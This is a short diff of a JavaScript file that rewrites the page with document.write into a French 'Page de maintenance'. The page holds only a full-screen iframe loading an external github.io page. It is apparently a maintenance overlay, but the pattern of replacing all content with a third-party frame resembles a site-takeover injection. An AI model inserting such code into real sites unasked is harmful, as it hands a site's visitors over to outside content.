@@ -1,6 +1,4 @@
-document.write("<!DOCTYPE html>\r\n<html lang=\"fr\">\r\n<body>\r\n    \r\n    <iframe class=\"mntfrpl\" src=\"https:\/\/pikayutmg.github.io\/mtn.html\"> <\/iframe>\r\n    \r\n<\/body>\r\n<\/html>\r\n\r\n<style>\r\n    \r\n    .mntfrpl {\r\n        \r\n        position: absolute;\r\n        top: 0px;\r\n        left: 0px;\r\n        right: 0px;\r\n        bottom: 0px;\r\n        \r\n    }\r\n    \r\n<\/style>");
-
-
+document.write("<!DOCTYPE html>\r\n<html lang=\"fr\">\r\n<head>\r\n  <meta charset=\"UTF-8\">\r\n  <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\r\n  <title>Page de maintenance<\/title>\r\n  <style>\r\n    .framedd {\r\n      border: 0;\r\n      position: fixed;\r\n      top: 0;\r\n      left: 0;\r\n      right: 0;\r\n      bottom: 0;\r\n      width: 100%;\r\n      height: 100%;\r\n    }\r\n  <\/style>\r\n<\/head>\r\n<body>\r\n  <iframe class=\"framedd\" src=\"https:\/\/pikayutmg.github.io\/mtn.html\"><\/iframe>\r\n<\/body>\r\n<\/html>");
 
 
 
